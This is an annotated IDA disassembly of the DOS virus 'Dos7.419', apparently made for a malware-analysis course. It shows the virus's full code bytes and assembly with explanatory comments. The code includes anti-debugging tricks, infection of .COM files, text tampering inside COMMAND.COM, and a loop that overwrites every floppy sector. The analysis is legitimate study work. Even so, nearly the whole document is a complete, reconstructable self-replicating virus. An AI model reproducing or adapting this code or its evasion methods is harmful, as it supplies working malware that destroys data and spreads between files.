seg000:0100                            ;
seg000:0100                            ; +-------------------------------------------------------------------------+
seg000:0100                            ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:0100                            ; |           Copyright (c) 2023 Hex-Rays, <support@hex-rays.com>           |
seg000:0100                            ; |                      License info: 48-BABB-7E64-E2                      |
seg000:0100                            ; |                     Georgia Institute of Technology                     |
seg000:0100                            ; +-------------------------------------------------------------------------+
seg000:0100                            ;
seg000:0100                            ; Input SHA256 : 7E00694397CBB7B422CB2F3E39A34C7FB7554931A1A9A2CF9AE7B2BCF42296E3
seg000:0100                            ; Input MD5    : 0B4A318803AA1B9B6A0DCC55CEFCB7CE
seg000:0100                            ; Input CRC32  : 785762D7
seg000:0100
seg000:0100                            ; ---------------------------------------------------------------------------
seg000:0100                            ; File Name   : /nethome/gweese3/malware/Virus.DOS.Dos7.419
seg000:0100                            ; Format      : Binary file
seg000:0100                            ; Base Address: 0000h Range: 0100h - 02C8h Loaded length: 01C8h
seg000:0100
seg000:0100                                            .686p
seg000:0100                                            .mmx
seg000:0100                                            .model small
seg000:0100
seg000:0100                            ; ===========================================================================
seg000:0100
seg000:0100                            ; Segment type: Pure code
seg000:0100                            seg000          segment byte public 'CODE' use16
seg000:0100                                            assume cs:seg000
seg000:0100                                            ;org 100h
seg000:0100                                            assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:0100 C7 06 07 01 52 01                          mov     word ptr ds:Trick_168+1, 152h ; Overwrite the immediate value of 168h with 152h, this will be used to trick any debuggers that run command.
seg000:0100                                                                    ;
seg000:0100                                                                    ; In short: A CPU in the runtime environment will precache instructions a few instructions ahead, which means that the overwrite won't actually take effect because the CPU has already fetched the 168 portion.
seg000:0100                                                                    ;
seg000:0100                                                                    ; Debuggers do not have any precaching, so this will edit the command and fall into the trap commented below.
seg000:0106
seg000:0106                            Trick_168:                              ; DATA XREF: seg000:0100↑w
seg000:0106 B8 68 01                                   mov     ax, 168h        ; This is unchanged because of instruction prefetching, debugger shows as 152h, actually unchanged
seg000:0109 A3 2E 01                                   mov     word ptr ds:replaceint0+5, ax ; Actually overwrite the MOV src with either 152h or 168h
seg000:010C 2B C0                                      sub     ax, ax          ; AX = 0
seg000:010E 1E                                         push    ds              ; Save command.com segment on the stack, in debugging seg000
seg000:010F 8E D8                                      mov     ds, ax          ; DS = 0
seg000:0111 8E C0                                      mov     es, ax          ; ES = 0
seg000:0113 BE 84 00                                   mov     si, 84h         ; This is the offset of the int21h handler 84h = 21*4
seg000:0116 BF 0C 00                                   mov     di, 0Ch         ; Address of the int3h handler = 0C = 3h*4
seg000:0119 A5                                         movsw                   ; Int 3 now runs in 21
seg000:011A A5                                         movsw                   ; Overwrite int3h address segment
seg000:011A                                                                    ;
seg000:011A                                                                    ; When using a debugger, this will now crash the box.
seg000:011A                                                                    ;
seg000:011A                                                                    ; This takes over software breakpoints in a debugger
seg000:011B 26 A1 00 00                                mov     ax, es:0        ; Save the int 0h offset
seg000:011F A3 70 01                                   mov     word ptr ds:int0_offset+5, ax ; Correct later instruction with correct in 0h offset
seg000:011F                                                                    ;
seg000:011F                                                                    ; Note: There is a bug in this code.
seg000:011F                                                                    ;
seg000:011F                                                                    ; DS is 0 at this point in the code. The code is written so that this will later restore functionality of the divide/0 interrupt.
seg000:011F                                                                    ;
seg000:011F                                                                    ; This actually points to a random space in memory, so while the virus will work, but it will not restore functionality. ds pop below should have been above this code
seg000:0122 26 A1 02 00                                mov     ax, es:2        ; Get int 0h seg
seg000:0126 A3 77 01                                   mov     word ptr ds:int0_seg+5, ax ; Set the actual int0h seg later in the instruction
seg000:0129
seg000:0129                            replaceint0:                            ; DATA XREF: seg000:0109↑w
seg000:0129 26 C7 06 00 00 68 01                       mov     word ptr es:0, 168h ; Edited from above, runtime environment has this as 168h, debug environment has 152h. Store modified int0 offset
seg000:0130 1F                                         pop     ds              ; DS = seg 0
seg000:0131 8C D8                                      mov     ax, ds          ; ax = 100 from seg 0
seg000:0133 80 C4 10                                   add     ah, 10h         ; virus is relocating to higher memory, 1100h in debug, but in runtime is wherever the virus is otherwise located in memory
seg000:0136 26 A3 02 00                                mov     es:2, ax        ; We are now actually changing the int0h segment to point to the future virus copy
seg000:013A 8E C0                                      mov     es, ax          ; = 1100h, future virus copy segment
seg000:013C                                            assume es:nothing
seg000:013C BF 00 01                                   mov     di, 100h        ; di = 100h
seg000:013F 8B F7                                      mov     si, di          ; si = 100h
seg000:0141 B9 A3 01                                   mov     cx, 1A3h        ; save decimal 419 bytes to move the virus
seg000:0144 F3 A4                                      rep movsb               ; Movsb gets value from count register(cx), which will move 419 bytes from ds:si to es:di. This makes a copy of the virus
seg000:0144                                                                    ;
seg000:0144                                                                    ; Memory now looks like 1100h:100h
seg000:0146 8E D8                                      mov     ds, ax          ; ds = 1100h, virus copy
seg000:0148                                            assume ds:nothing
seg000:0148 F7 F1                                      div     cx              ; CX is 0 after rep movsb above, this procs a div/0 error which calls int0, which was replaced above
seg000:0148                                                                    ; seg:168h OR seg:152h if in the debugger.
seg000:0148                                                                    ;
seg000:0148                                                                    ;
seg000:0148                                                                    ; THERE IS NO FALLTHROUGH HERE
seg000:014A
seg000:014A                            close_file:                             ; CODE XREF: seg000:01AB↓j
seg000:014A B4 3E                                      mov     ah, 3Eh ; '>'   ; set ah for close file int21h call below
seg000:014C CC                                         int     3               ; Call int21h close file
seg000:014D
seg000:014D                            next_file:                              ; CODE XREF: seg000:0195↓j
seg000:014D                                                                    ; seg000:01A5↓j
seg000:014D B4 4F                                      mov     ah, 4Fh ; 'O'   ; Call find next matching file int21
seg000:014F CC                                         int     3               ; call int21
seg000:0150 EB 3A                                      jmp     short read_file ; Read the file
seg000:0152                            ; ---------------------------------------------------------------------------
seg000:0152 2B C9                                      sub     cx, cx          ; offset 152 from earlier debugger trick
seg000:0152                                                                    ;
seg000:0152                                                                    ; sets cx = 0
seg000:0154
seg000:0154                            flood_floppy:                           ; CODE XREF: seg000:0166↓j
seg000:0154 41                                         inc     cx              ; cx +=1
seg000:0155 0E                                         push    cs              ; cs = seg 0
seg000:0156 07                                         pop     es              ; es = cs = seg 0
seg000:0157                                            assume es:nothing
seg000:0157
seg000:0157                            loc_157:                                ; CODE XREF: seg000:015A↓j
seg000:0157 B8 05 FE                                   mov     ax, 0FE05h      ; ax = FE05h
seg000:015A EB FC                                      jmp     short near ptr loc_157+1 ; When you jump to the lab + 1 byte, you jump to the
seg000:015A                                                                    ; middle of the move instruction above.
seg000:015A                                                                    ;
seg000:015A                                                                    ; mov instruction above is
seg000:015A                                                                    ; B8 05 FE EB FC,
seg000:015A                                                                    ; The JMP targets the 05 byte which is the opcode for a 16-bit immediate add to the register ax,
seg000:015A                                                                    ;
seg000:015A                                                                    ; THUS
seg000:015A                                                                    ; ax <-- ax+EBFEh
seg000:015A                                                                    ; The remaining byte, FC is the opcode for single byte instruction CLD.
seg000:015A                                                                    ;
seg000:015A                                                                    ; This consumes the above add, and the jump, modifying the ax.
seg000:015A                                                                    ;
seg000:015A                                                                    ; this helps set the ax value for the int13h, but also has the human factor of distracting someone single stepping through a debugger while their data gets destroyed. The neccessary value of ax for the int13 call could have just been done directly with a mov, but its to distract.
seg000:015C                            ; ---------------------------------------------------------------------------
seg000:015C 2D 02 E7                                   sub     ax, 0E702h      ; EA03h - E702 = 301h
seg000:015F B7 01                                      mov     bh, 1           ; BH=1 , bx = 100h, start of virus
seg000:0161 BA 00 00                                   mov     dx, 0           ; DX =0
seg000:0164 CD 13                                      int     13h             ; Write floppy sectors from memory
seg000:0164                                                                    ; number of sectors =1 =al
seg000:0164                                                                    ; DH = DL = 0, 1st floppy
seg000:0164                                                                    ; ES:BX, = seg0:100h
seg000:0164                                                                    ; Cx is being incremented in the loop, slowly hitting every track and every sector
seg000:0164                                                                    ; Save every sector of every track a copy of the virus
seg000:0166 EB EC                                      jmp     short flood_floppy ; infinitely loop
seg000:0168                            ; ---------------------------------------------------------------------------
seg000:0168 06                                         push    es              ; Runtime environment actually goes here
seg000:0168                                                                    ; Add 1100h onto the stack
seg000:0169 51                                         push    cx              ; CX is still 0 after the rep movsb
seg000:016A 07                                         pop     es              ; es=cx=0
seg000:016B
seg000:016B                            int0_offset:                            ; DATA XREF: seg000:011F↑w
seg000:016B 26 C7 06 00 00 4C 4D                       mov     word ptr es:0, 4D4Ch ; Changed from earlier in the code, is actually int0 offset, this will now fix the /0 offset
seg000:0172
seg000:0172                            int0_seg:                               ; DATA XREF: seg000:0126↑w
seg000:0172 26 C7 06 02 00 41 53                       mov     word ptr es:2, 5341h ; changed from earlier in the segment, actually int0 seg
seg000:0179 07                                         pop     es              ; ES is back being 1100h
seg000:017A C7 06 07 01 68 01                          mov     word ptr ds:107h, 168h ; CPU has already assumed 168h from precaching,
seg000:017A                                                                    ; but earlier code changed it in order to fool a debugger.
seg000:017A                                                                    ;
seg000:017A                                                                    ;
seg000:017A                                                                    ; need to change it back so that the virus runs as intended, presumably after the debugger has already fallen into the trap
seg000:0180 B4 1A                                      mov     ah, 1Ah         ; ah = 1ah is set disk transfer address(change dta)
seg000:0182 99                                         cwd                     ; Dx = 0, offset of dta set to 0
seg000:0183 CC                                         int     3               ; Actually int21, set DTA call seg:offset 1100h:0
seg000:0184 B4 4E                                      mov     ah, 4Eh ; 'N'   ; int21h find first matching file
seg000:0186 2B C9                                      sub     cx, cx          ; CX= 0, no attributes
seg000:0188 BA 23 02                                   mov     dx, 223h        ; Get data from later in the program, searching wildcard matches for .COM files
seg000:018B CC                                         int     3               ; Actually int21h call, update DTA with returned file info
seg000:018C
seg000:018C                            read_file:                              ; CODE XREF: seg000:0150↑j
seg000:018C 72 7E                                      jb      short infection_cleanup ; finished finding all .com files so exit
seg000:018E B8 02 3D                                   mov     ax, 3D02h       ; int 21 open file,
seg000:018E                                                                    ; access/read write
seg000:0191 BA 1E 00                                   mov     dx, 1Eh         ; Offset to point to an ASCII file name
seg000:0194 CC                                         int     3               ; Actually a int21 call, ax= file handle on return
seg000:0195 72 B6                                      jb      short next_file ; If there is an error opening the file, just go to the next file
seg000:0197 8B D8                                      mov     bx, ax          ; Store the returned file handler in bx
seg000:0199 B4 3F                                      mov     ah, 3Fh ; '?'   ; Int21 read from file
seg000:0199                                                                    ; BX previously set as file handle before this call
seg000:019B BF 1A 00                                   mov     di, 1Ah         ; Load the address of the file size from the DTA
seg000:019B                                                                    ; Di = file size
seg000:019E 8B 0D                                      mov     cx, [di]        ; CX = file size as number of bytes
seg000:01A0 8B D6                                      mov     dx, si          ; OFFSET OF THE POINTER IS 2A3h, DS is seg for the call
seg000:01A2 CC                                         int     3               ; Actually an int21h call, ax = # of bytes read on the return
seg000:01A3 8B 04                                      mov     ax, [si]        ; Get the first word of the file in the virus copy
seg000:01A5 72 A6                                      jb      short next_file ; if above errors, go to the next file
seg000:01A7 3B 06 00 01                                cmp     ax, ds:100h     ; Check if the first word of the file = first word of the virus, if so, we don't need to re-infect it
seg000:01AB 74 9D                                      jz      short close_file ; If same, file is infected
seg000:01AD 8B 44 02                                   mov     ax, [si+2]      ; Get the next word of the file
seg000:01B0 3D 15 60                                   cmp     ax, 6015h       ; Is this file Command.COM?
seg000:01B3 74 02                                      jz      short infect_command ; go to the special logic for command.com
seg000:01B5 EB 3F                                      jmp     short infect_wildcard_com ; If its a general com file, go to that file
seg000:01B7                            ; ---------------------------------------------------------------------------
seg000:01B7
seg000:01B7                            infect_command:                         ; CODE XREF: seg000:01B3↑j
seg000:01B7 57                                         push    di              ; Di on the stack, 1ah
seg000:01B8 56                                         push    si              ; Si on the stack, 2a3
seg000:01B9 BE 4D 02                                   mov     si, 24Dh        ; Get string from below "MSDOS 7 (C) 1993 ANARKICK Systems DOS 6 Antivirus Sucks. It missed this one! $"
seg000:01BC BF F0 23                                   mov     di, 23F0h       ; Overwrite 224Dh(23F0-1A3)in COMMAND.COM
seg000:01BC                                                                    ; (Copyright text)
seg000:01BF B9 55 00                                   mov     cx, 55h ; 'U'   ; CX = 55h 85 bytes for string
seg000:01C2 90                                         nop
seg000:01C3 FC                                         cld                     ; Inc si and di
seg000:01C4 F3 A4                                      rep movsb               ; Actually replace the values in COMMAND.COM with the previously given string.
seg000:01C6 BE 2A 02                                   mov     si, 22Ah        ; Get "is infected!" string from below
seg000:01C9 BF 57 90                                   mov     di, 9057h       ; Overwrite 'drive has no label text'(9057h- 1A3) = 8EB4h
seg000:01CC B9 0C 00                                   mov     cx, 0Ch         ; CX = 0C, 12 bytes for string
seg000:01CF 90                                         nop
seg000:01D0 F3 A4                                      rep movsb               ; Actually overwrite text, "has no label" is now "is infected"
seg000:01D2 BE 36 02                                   mov     si, 236h        ; Get text "oy, are you ever dumb!" from below
seg000:01D5 BF 4C 91                                   mov     di, 914Ch       ; 913C -1A3 = 8EA9 in COMMAND.com
seg000:01D5                                                                    ; Replaces("bad command or filename"
seg000:01D8 B9 17 00                                   mov     cx, 17h         ; cx = 23 bytes for string
seg000:01DB 90                                         nop
seg000:01DC F3 A4                                      rep movsb               ; Actually replace the string
seg000:01DE B8 00 42                                   mov     ax, 4200h       ; Move file pointer int command,
seg000:01DE                                                                    ; 00 means beginning of file
seg000:01E1 2B D2                                      sub     dx, dx          ; clear dx
seg000:01E3 8B CA                                      mov     cx, dx          ; clear cx
seg000:01E5 CC                                         int     3               ; Call int21h move file pointer
seg000:01E6 B4 40                                      mov     ah, 40h ; '@'   ; Write to file or device
seg000:01E8 BA A3 02                                   mov     dx, 2A3h        ; Buffer area ds:2A3H
seg000:01EB B9 BD CE                                   mov     cx, 0CEBDh      ; Set # of bytes to write
seg000:01EE CC                                         int     3               ; Call int21 to write the COMMAND.COM with changed strings over the original COMMAND.COM file
seg000:01EF B4 3E                                      mov     ah, 3Eh ; '>'   ; Close file
seg000:01F1 CC                                         int     3               ; Close the file
seg000:01F2 5E                                         pop     si              ; Si off the stack
seg000:01F3 5F                                         pop     di              ; di off the stack
seg000:01F4 EB 16                                      jmp     short infection_cleanup ; Go to last virus section
seg000:01F6                            ; ---------------------------------------------------------------------------
seg000:01F6
seg000:01F6                            infect_wildcard_com:                    ; CODE XREF: seg000:01B5↑j
seg000:01F6 B8 00 42                                   mov     ax, 4200h       ; move file pointer, offset 00 means start of the file
seg000:01F9 2B D2                                      sub     dx, dx          ; DX = 0
seg000:01FB 8B CA                                      mov     cx, dx          ; Cx = 0
seg000:01FD CC                                         int     3               ; Call 21h,
seg000:01FD                                                                    ; set pointer to the beginning of the file
seg000:01FE FE C6                                      inc     dh              ; Increment dh, dx = 100h(starts after PSP)
seg000:0200 B4 40                                      mov     ah, 40h ; '@'   ; write to file or device
seg000:0202 8B 0D                                      mov     cx, [di]        ; cx = number of bytes read from file opening call that calls infect com file subroutine
seg000:0204 81 C1 A3 01                                add     cx, 1A3h        ; Add byte size of the virus
seg000:0208 CC                                         int     3               ; Call in21 and write the same file except add the virus code at the top
seg000:0209 B4 3E                                      mov     ah, 3Eh ; '>'   ; Close file
seg000:020B CC                                         int     3               ; Call int21 and close file
seg000:020C
seg000:020C                            infection_cleanup:                      ; CODE XREF: seg000:read_file↑j
seg000:020C                                                                    ; seg000:01F4↑j
seg000:020C 8C D0                                      mov     ax, ss          ; ax = seg0
seg000:020E 8E C0                                      mov     es, ax          ; es = seg0
seg000:0210 8E D8                                      mov     ds, ax          ; ds = seg0
seg000:0212                                            assume ds:nothing
seg000:0212 50                                         push    ax              ; ax on the stack
seg000:0213 B4 1A                                      mov     ah, 1Ah         ; Set DTA
seg000:0215 D1 EA                                      shr     dx, 1           ; Logical shift right, 100/2 = 80h, this is the PSP offset(the original DTA location)
seg000:0215                                                                    ;
seg000:0215                                                                    ; Set the DTA back to where it is expected to be.
seg000:0217 CC                                         int     3               ; Int21 set DTA, Shift by the original offset of the non-virus DTA
seg000:0218 BF 00 01                                   mov     di, 100h        ; di = 100h
seg000:021B 57                                         push    di              ; Di on the stack
seg000:021C 8B CC                                      mov     cx, sp          ; MOVE EVERYTHING BETWEEN SP AND THE BEGINNING OF THE ORIGINAL .COM code
seg000:021E 2B CE                                      sub     cx, si          ; original file size - si, si = 2A3h
seg000:0220 F3 A4                                      rep movsb               ; Overwrite the entire virus(not the copy of the virus) even overwrites the two instructions below
seg000:0220                                                                    ;
seg000:0220                                                                    ; Note, this means that DoS7 will only be overwriting one .com file per instance of the virus running. COMMAND.COM will still be infected.
seg000:0222 CB                                         retf                    ; pop off of the stack and return control to the original code, this also takes advantage of the prefetch cache, because this memory has been overwritten with the file
seg000:0222                            ; ---------------------------------------------------------------------------
seg000:0223 2A                                         db  2Ah ; *
seg000:0224 57                                         db  57h ; W
seg000:0225 2E                                         db  2Eh ; .
seg000:0226 43                                         db  43h ; C
seg000:0227 3F                                         db  3Fh ; ?
seg000:0228 4D                                         db  4Dh ; M
seg000:0229 00                                         db    0
seg000:022A 69                                         db  69h ; i
seg000:022B 73                                         db  73h ; s
seg000:022C 20                                         db  20h
seg000:022D 69                                         db  69h ; i
seg000:022E 6E                                         db  6Eh ; n
seg000:022F 66                                         db  66h ; f
seg000:0230 65                                         db  65h ; e
seg000:0231 63                                         db  63h ; c
seg000:0232 74                                         db  74h ; t
seg000:0233 65                                         db  65h ; e
seg000:0234 64                                         db  64h ; d
seg000:0235 21                                         db  21h ; !
seg000:0236 6F                                         db  6Fh ; o
seg000:0237 79                                         db  79h ; y
seg000:0238 2C                                         db  2Ch ; ,
seg000:0239 20                                         db  20h
seg000:023A 61                                         db  61h ; a
seg000:023B 72                                         db  72h ; r
seg000:023C 65                                         db  65h ; e
seg000:023D 20                                         db  20h
seg000:023E 79                                         db  79h ; y
seg000:023F 6F                                         db  6Fh ; o
seg000:0240 75                                         db  75h ; u
seg000:0241 20                                         db  20h
seg000:0242 65                                         db  65h ; e
seg000:0243 76                                         db  76h ; v
seg000:0244 65                                         db  65h ; e
seg000:0245 72                                         db  72h ; r
seg000:0246 20                                         db  20h
seg000:0247 64                                         db  64h ; d
seg000:0248 75                                         db  75h ; u
seg000:0249 6D                                         db  6Dh ; m
seg000:024A 62                                         db  62h ; b
seg000:024B 21                                         db  21h ; !
seg000:024C 20                                         db  20h
seg000:024D 4D                                         db  4Dh ; M
seg000:024E 53                                         db  53h ; S
seg000:024F 44                                         db  44h ; D
seg000:0250 4F                                         db  4Fh ; O
seg000:0251 53                                         db  53h ; S
seg000:0252 20                                         db  20h
seg000:0253 37                                         db  37h ; 7
seg000:0254 20                                         db  20h
seg000:0255 28                                         db  28h ; (
seg000:0256 43                                         db  43h ; C
seg000:0257 29                                         db  29h ; )
seg000:0258 31                                         db  31h ; 1
seg000:0259 39                                         db  39h ; 9
seg000:025A 39                                         db  39h ; 9
seg000:025B 33                                         db  33h ; 3
seg000:025C 20                                         db  20h
seg000:025D 41                                         db  41h ; A
seg000:025E 4E                                         db  4Eh ; N
seg000:025F 41                                         db  41h ; A
seg000:0260 52                                         db  52h ; R
seg000:0261 4B                                         db  4Bh ; K
seg000:0262 49                                         db  49h ; I
seg000:0263 43                                         db  43h ; C
seg000:0264 4B                                         db  4Bh ; K
seg000:0265 20                                         db  20h
seg000:0266 53                                         db  53h ; S
seg000:0267 59                                         db  59h ; Y
seg000:0268 53                                         db  53h ; S
seg000:0269 54                                         db  54h ; T
seg000:026A 45                                         db  45h ; E
seg000:026B 4D                                         db  4Dh ; M
seg000:026C 53                                         db  53h ; S
seg000:026D 0D                                         db  0Dh
seg000:026E 0A                                         db  0Ah
seg000:026F 01                                         db    1
seg000:0270 01                                         db    1
seg000:0271 01                                         db    1
seg000:0272 20                                         db  20h
seg000:0273 20                                         db  20h
seg000:0274 20                                         db  20h
seg000:0275 20                                         db  20h
seg000:0276 20                                         db  20h
seg000:0277 44                                         db  44h ; D
seg000:0278 4F                                         db  4Fh ; O
seg000:0279 53                                         db  53h ; S
seg000:027A 20                                         db  20h
seg000:027B 36                                         db  36h ; 6
seg000:027C 20                                         db  20h
seg000:027D 41                                         db  41h ; A
seg000:027E 6E                                         db  6Eh ; n
seg000:027F 74                                         db  74h ; t
seg000:0280 69                                         db  69h ; i
seg000:0281 76                                         db  76h ; v
seg000:0282 69                                         db  69h ; i
seg000:0283 72                                         db  72h ; r
seg000:0284 75                                         db  75h ; u
seg000:0285 73                                         db  73h ; s
seg000:0286 20                                         db  20h
seg000:0287 73                                         db  73h ; s
seg000:0288 75                                         db  75h ; u
seg000:0289 63                                         db  63h ; c
seg000:028A 6B                                         db  6Bh ; k
seg000:028B 73                                         db  73h ; s
seg000:028C 2E                                         db  2Eh ; .
seg000:028D 20                                         db  20h
seg000:028E 49                                         db  49h ; I
seg000:028F 74                                         db  74h ; t
seg000:0290 20                                         db  20h
seg000:0291 6D                                         db  6Dh ; m
seg000:0292 69                                         db  69h ; i
seg000:0293 73                                         db  73h ; s
seg000:0294 73                                         db  73h ; s
seg000:0295 65                                         db  65h ; e
seg000:0296 64                                         db  64h ; d
seg000:0297 20                                         db  20h
seg000:0298 74                                         db  74h ; t
seg000:0299 68                                         db  68h ; h
seg000:029A 69                                         db  69h ; i
seg000:029B 73                                         db  73h ; s
seg000:029C 20                                         db  20h
seg000:029D 6F                                         db  6Fh ; o
seg000:029E 6E                                         db  6Eh ; n
seg000:029F 65                                         db  65h ; e
seg000:02A0 21                                         db  21h ; !
seg000:02A1 20                                         db  20h
seg000:02A2 24                                         db  24h ; $
seg000:02A3                            ; ---------------------------------------------------------------------------
seg000:02A3 B4 09                                      mov     ah, 9           ; This is a first generation version of the virus.
seg000:02A3                                                                    ;
seg000:02A3                                                                    ; It needs to be here because the virus needs to run originally,
seg000:02A3                                                                    ;
seg000:02A3                                                                    ;
seg000:02A3                                                                    ; Display the following string
seg000:02A5 BA 09 01                                   mov     dx, 109h        ; Point to "[DOS 7V    ] Lucifer Messiah$"
seg000:02A8 CC                                         int     3               ; Call int21 print string above
seg000:02A9 B4 4C                                      mov     ah, 4Ch ; 'L'   ; Terminate program and return to Command.COM
seg000:02AB CC                                         int     3               ; Call int21h and end the virus
seg000:02AB                            ; ---------------------------------------------------------------------------
seg000:02AC 5B                                         db  5Bh ; [
seg000:02AD 44                                         db  44h ; D
seg000:02AE 4F                                         db  4Fh ; O
seg000:02AF 53                                         db  53h ; S
seg000:02B0 20                                         db  20h
seg000:02B1 37                                         db  37h ; 7
seg000:02B2 76                                         db  76h ; v
seg000:02B3 01                                         db    1
seg000:02B4 01                                         db    1
seg000:02B5 01                                         db    1
seg000:02B6 5D                                         db  5Dh ; ]
seg000:02B7 20                                         db  20h
seg000:02B8 4C                                         db  4Ch ; L
seg000:02B9 75                                         db  75h ; u
seg000:02BA 63                                         db  63h ; c
seg000:02BB 69                                         db  69h ; i
seg000:02BC 66                                         db  66h ; f
seg000:02BD 65                                         db  65h ; e
seg000:02BE 72                                         db  72h ; r
seg000:02BF 20                                         db  20h
seg000:02C0 4D                                         db  4Dh ; M
seg000:02C1 65                                         db  65h ; e
seg000:02C2 73                                         db  73h ; s
seg000:02C3 73                                         db  73h ; s
seg000:02C4 69                                         db  69h ; i
seg000:02C5 61                                         db  61h ; a
seg000:02C6 68                                         db  68h ; h
seg000:02C7 24                                         db  24h ; $
seg000:02C7                            seg000          ends
seg000:02C7
seg000:02C7
seg000:02C7                                            end
